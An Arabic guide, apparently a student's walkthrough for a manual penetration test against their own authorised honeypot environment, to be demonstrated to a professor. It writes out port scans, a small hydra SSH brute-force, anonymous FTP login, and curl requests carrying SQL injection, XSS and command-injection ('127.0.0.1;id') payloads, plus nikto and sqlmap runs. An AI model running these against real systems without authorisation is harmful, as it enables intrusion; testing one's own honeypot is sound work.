# الهجوم اليدوي المسموح على بيئة Cyber Mirage

> هذا الدليل يشرح خطوات تنفيذ اختبار اختراق *يدوي* من جهاز Ubuntu ضد الـ Honeypots المصرّح بها (IP: `13.53.131.159`). لا تستخدم هذه الأوامر ضد أنظمة ليس لديك تصريح عليها.

## 1. تجهيز بيئة Ubuntu
```bash
sudo apt update
sudo apt install -y nmap hydra sqlmap nikto curl netcat-openbsd ftp telnet mysql-client hping3
```
(يمكنك إضافة `metasploit-framework` لاحقاً إذا رغبت)

تحقق من الشبكة:
```bash
ping -c 4 13.53.131.159
traceroute 13.53.131.159 || sudo apt install -y traceroute
```

## 2. فحص المنافذ الأساسي
سريع:
```bash
nmap -Pn -p 2121,2222,2323,3307,8080,8501 13.53.131.159
```
تحديد الإصدارات:
```bash
nmap -sV -p 2121,2222,2323,3307,8080,8501 13.53.131.159
```
فحص أوسع (اختياري):
```bash
nmap -sC -sV -T4 -p- --min-rate 300 13.53.131.159 | tee full_scan.txt
```

## 3. استكشاف كل خدمة يدويًا
### SSH (منفذ 2222)
```bash
ssh -p 2222 root@13.53.131.159
ssh -p 2222 admin@13.53.131.159
```
إذا طلب كلمة مرور جرّب كلمات بسيطة محدودة (لا تستخدم قوائم ضخمة أمام الدكتور لتجنب الضجيج).

بديل محدود باستخدام hydra (عرض فقط):
```bash
hydra -l root -P <(echo -e "admin\n123456\npassword") -t 3 ssh://13.53.131.159:2222
```

### FTP (منفذ 2121)
```bash
ftp 13.53.131.159 2121
# User: anonymous
# Pass: anonymous
ls
quit
```

### Telnet (2323)
```bash
telnet 13.53.131.159 2323
```
راقب الـ Banner الأولي ثم اغلق.

### MySQL (3307)
```bash
mysql -h 13.53.131.159 -P 3307 -u root -p
```
إذا فشل الدخول شاهد الـ Banner ببايتات أولية عبر netcat:
```bash
nc -v 13.53.131.159 3307 | xxd
```

### HTTP (8080)
عرض الصفحة:
```bash
curl -I http://13.53.131.159:8080/
curl http://13.53.131.159:8080/ | head
```
اختبار استعلامات حقن بسيطة:
```bash
curl "http://13.53.131.159:8080/login?user=admin'&pass=test"
curl "http://13.53.131.159:8080/search?q=<script>alert('XSS')</script>"
curl "http://13.53.131.159:8080/ping?host=127.0.0.1;id"
```
استخدم المتصفح لتكرارها ومراقبة الفرق.

### Dashboard (8501)
افتح:
```
http://13.53.131.159:8501
```
راقب زيادة عداد الهجمات بعد كل نشاط.

## 4. فحص ويب أعمق (اختياري)
Nikto:
```bash
nikto -h http://13.53.131.159:8080 -o nikto_report.txt
```
SQLMap اختبار واحد (لا تفرط):
```bash
sqlmap -u "http://13.53.131.159:8080/login?user=admin&pass=test" --batch --level=2 --risk=1 --flush-session
```

## 5. التحقق من ظهور النتائج
بعد كل مجموعة خطوات افتح الـ Dashboard وشاهد:
- قائمة الهجمات الحديثة
- المخطط الزمني الساعي
- أكثر العناوين IP تكراراً

(إذا فتحت Grafana بعد تفعيل المنفذ 3000 راقب لوحات Prometheus)

## 6. توثيق يدوي سريع
```bash
mkdir -p attack_session
cd attack_session
nmap -sV -p 2121,2222,2323,3307,8080,8501 13.53.131.159 > ports.txt
curl -I http://13.53.131.159:8080 > http_headers.txt
```
دوّن الملاحظات في ملف نصي:
```bash
nano notes.txt
```

## 7. عرض أمام الدكتور
رتّب العرض:
1. شرح الهدف (IP والخدمات المعروضة)
2. تشغيل nmap مختصر والنتائج
3. محاولة دخول SSH فاشلة توضح الرصد
4. Anonymous FTP (نجاح/فشل)
5. طلب HTTP بحقن بسيط ثم إظهار ظهوره في الـ Dashboard
6. فتح Dashboard وإظهار عداد الهجمات
7. (اختياري) لقطة من Grafana إذا تم فتح المنفذ 3000

## 8. أخطاء شائعة
- لا تستخدم wordlists ضخمة: ستبطئ العرض ولن تضيف قيمة
- تجنب hping3/flood أثناء العرض إلا إذا كان المطلوب توضيح DoS (استخدم حزمة واحدة فقط)
- تأكد من الوقت (UTC vs local) عند شرح الطوابع الزمنية

## 9. تنظيف بعد الانتهاء (اختياري)
لا حاجة لتنظيف كبير فهي Honeypots، لكن يمكنك تدوير الحاويات:
```bash
ssh -i ~/.ssh/cyber_mirage ubuntu@13.53.131.159 "cd /opt/cyber_mirage && sudo docker compose -f docker-compose.production.yml restart"
```

## 10. تذكير قانوني
كل ما تقوم به هنا ضمن بيئة مصرح لك باختبارها. لا تنقل هذه الأساليب إلى أنظمة أخرى بدون إذن مكتوب.

موفق في العرض ✅
